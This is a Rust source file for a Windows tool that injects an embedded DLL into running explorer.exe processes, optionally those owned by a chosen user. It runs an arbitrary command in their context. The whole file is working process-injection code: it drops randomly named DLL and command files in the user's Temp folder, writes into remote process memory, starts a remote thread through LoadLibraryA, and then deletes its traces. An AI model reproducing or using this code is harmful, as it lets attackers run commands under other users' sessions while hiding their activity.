mod utils;
use utils::*;

use rand::{distributions::Alphanumeric, thread_rng, Rng};
use std::{
    ffi::CString,
    fs::{self, File},
    io::Write,
    path::Path,
    process,
    time::Duration,
};

use windows::{
    core::Error,
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{VirtualAllocEx, MEM_COMMIT, PAGE_READWRITE},
            Threading::{CreateRemoteThread, GetExitCodeProcess, OpenProcess, PROCESS_ALL_ACCESS},
        },
    },
};

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 2 && args.len() != 3 {
        eprintln!("Usage: {} [?username] [command to inject]", args[0]);
        process::exit(1);
    }

    let explorers: Vec<u32> = match find_processes_by_name("explorer.exe") {
        Err(e) => {
            eprintln!("Got an error while finding processes: {:?}", e);
            return;
        }
        Ok(None) => {
            eprintln!("Could not find any explorer.exe");
            return;
        }
        Ok(Some(list)) => list,
    };

    let (wanted_username, cmd) = if args.len() > 2 {
        (Some(&args[1]), &args[2])
    } else {
        (None, &args[1])
    };

    for explorer_pid in explorers.iter() {
        if let Some(wanted_username) = wanted_username {
            let owner = match get_process_owner(*explorer_pid) {
                Ok(owner) => {
                    println!("[{}] {}\\{}", explorer_pid, owner.domain, owner.username);
                    if owner.username.as_str() != wanted_username {
                        println!(
                            "Skipping {}, since it is not owned by {}",
                            explorer_pid, wanted_username
                        );
                        continue;
                    }

                    owner
                }
                Err(e) => {
                    eprintln!("Failed to get owner for {}: {:?}", explorer_pid, e);
                    continue;
                }
            };

            println!("Trying to inject into {}", explorer_pid);
            if let Err(e) = inject(*explorer_pid, cmd, Some(&owner.profile_path)) {
                eprintln!("Failed to inject into {}: {:?}", explorer_pid, e);
            }
        } else {
            println!("Trying to inject into {}", explorer_pid);
            if let Err(e) = inject(*explorer_pid, cmd, None) {
                eprintln!("Failed to inject into {}: {:?}", explorer_pid, e);
            }
        }
    }
}

fn inject(process_id: u32, command: &str, profile_path: Option<&Path>) -> Result<(), Error> {
    let runner_dll = include_bytes!("../target/x86_64-pc-windows-gnu/release/runner.dll");
    let loadlibrarya_addr = get_proc_address("Kernel32.dll", "LoadLibraryA")
        .expect("Could not get address of LoadLibraryA");
    let temp_path = match profile_path {
        Some(path) => {
            let mut p = path.to_path_buf();
            p.push("AppData\\Local\\Temp");
            p
        }
        None => get_temp_path().expect("Failed to get temp path!"),
    };

    let proc_h = unsafe { OpenProcess(PROCESS_ALL_ACCESS, true, process_id)? };

    let mut rng = thread_rng();

    let (lib_path, command_path) = {
        let mut lib_path = temp_path.clone();
        let mut cmd_path = temp_path.clone();

        let mut rand_str = (0..12)
            .map(|_| rng.sample(Alphanumeric) as char)
            .collect::<String>();

        lib_path.push(format!("{}.dll", rand_str));
        cmd_path.push(format!("{}.cmd", rand_str));

        while lib_path.exists() || cmd_path.exists() {
            lib_path.pop();
            cmd_path.pop();

            rand_str = (0..12)
                .map(|_| rng.sample(Alphanumeric) as char)
                .collect::<String>();

            lib_path.push(format!("{}.dll", rand_str));
            cmd_path.push(format!("{}.cmd", rand_str));
        }

        (lib_path, cmd_path)
    };

    let loadlibrarya_addr = unsafe {
        std::mem::transmute::<
            unsafe extern "system" fn() -> isize,
            unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
        >(loadlibrarya_addr.unwrap())
    };

    println!("Writing library to {}...", lib_path.display());

    match File::create(&lib_path) {
        Ok(mut fd) => fd.write_all(runner_dll)?,
        Err(e) => {
            eprintln!("Failed to create file {}: {:?}", lib_path.display(), e);
            return Err(e.into());
        }
    };

    println!("Written content to {}", lib_path.display());

    println!("Writing command to {}...", command_path.display());
    fs::write(&command_path, command)?;

    let dll_path_arg = store_str_in_rem_proc_mem(proc_h, lib_path.as_path().to_str().unwrap())?;

    let thread_h = unsafe {
        CreateRemoteThread(
            proc_h,
            None,
            0,
            Some(loadlibrarya_addr),
            Some(dll_path_arg),
            0,
            None,
        )?
    };

    println!("Spawned thread...");

    unsafe {
        CloseHandle(thread_h)?;
    }

    loop {
        let mut exit_code: u32 = 0;
        unsafe {
            GetExitCodeProcess(proc_h, &mut exit_code as *mut _).ok();
        }

        if !command_path.exists() || exit_code != 259 {
            if command_path.exists() {
                if let Err(e) = fs::remove_file(&command_path) {
                    eprintln!("Failed to remove {}: {:?}", command_path.display(), e);
                }
            }
            break;
        }
        println!("Waiting...");
        std::thread::sleep(Duration::from_secs(1));
    }

    for _ in 0..3 {
        if let Ok(_) = fs::remove_file(&lib_path) {
            break;
        }
        std::thread::sleep(Duration::from_secs(1));
    }

    Ok(())
}

fn store_str_in_rem_proc_mem(
    proc_handle: HANDLE,
    data: &str,
) -> Result<*mut core::ffi::c_void, Error> {
    let data = CString::new(data).unwrap();
    let data_len = data.as_bytes().len() + 1;
    let raw_data = data.into_raw();

    let alloc_mem =
        unsafe { VirtualAllocEx(proc_handle, None, data_len, MEM_COMMIT, PAGE_READWRITE) };

    if alloc_mem.is_null() {
        return Ok(alloc_mem);
    }

    let mut written_bytes = 0usize;

    unsafe {
        if let Err(e) = WriteProcessMemory(
            proc_handle,
            alloc_mem,
            raw_data as *mut std::ffi::c_void,
            data_len,
            Some(&mut written_bytes as *mut _),
        ) {
            let _ = CString::from_raw(raw_data);
            return Err(e);
        }
    }

    let _ = unsafe { CString::from_raw(raw_data) };

    Ok(alloc_mem)
}
